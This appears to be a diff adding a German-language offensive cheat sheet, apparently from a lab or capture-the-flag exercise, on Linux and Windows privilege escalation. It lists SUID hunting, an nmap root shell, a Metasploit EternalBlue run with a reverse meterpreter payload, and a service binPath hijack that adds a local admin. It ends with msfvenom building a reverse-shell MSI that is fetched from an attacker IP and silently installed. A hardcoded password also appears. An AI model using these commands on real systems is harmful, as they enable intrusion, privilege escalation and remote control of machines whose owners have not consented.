@@ -1,0 +1,42 @@
+Linux
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+Spawnt eine vollständige Bash-Shell (besseres Terminalverhalten).
+
+sudo /bin/bash
+Erhöht Rechte mit bekanntem Passwort (z. B. SUPERultimatePASSWORDyouCANTget).
+
+su - root oder su - nutzer
+Wechselt zum Root-Benutzer mit Passwort.
+
+find / -perm -4000 -type f 2>/dev/null
+Sucht nach SUID-Binaries (z. B. nmap) für Privilege Escalation.
+
+nmap --interactive + !sh
+Nutzt Nmap mit SUID-Bit, um eine Root-Shell zu erhalten.
+
+Windows
+
+Metasploit: MS17-010 EternalBlue
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.160
+set RPORT 445
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+run
+
+Exploitiert MS17-010 für Root-Zugriff.
+
+powershell -ExecutionPolicy Bypass -File C:\Users\Public\check.ps1
+Führt Privilege Escalation Checks mit PrivescCheck.ps1 aus.
+
+sc config iphlpsvc binPath= "cmd.exe /c net localgroup administratoren jenny /add"
+sc stop iphlpsvc
+sc start iphlpsvc
+Ändert einen Dienst, um Admin-Rechte für Jenny hinzuzufügen, z.B. AllAccess-Exploit
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.2.103 LPORT=4444 -f msi > evil.msi und vorher Listener auf 4444
+iwr http://192.168.2.103:8080/evil.msi -OutFile C:\Users\Public\evil.msi
+msiexec /quiet /qn /i C:\Users\Public\evil.msi
+für allaccess Exploit
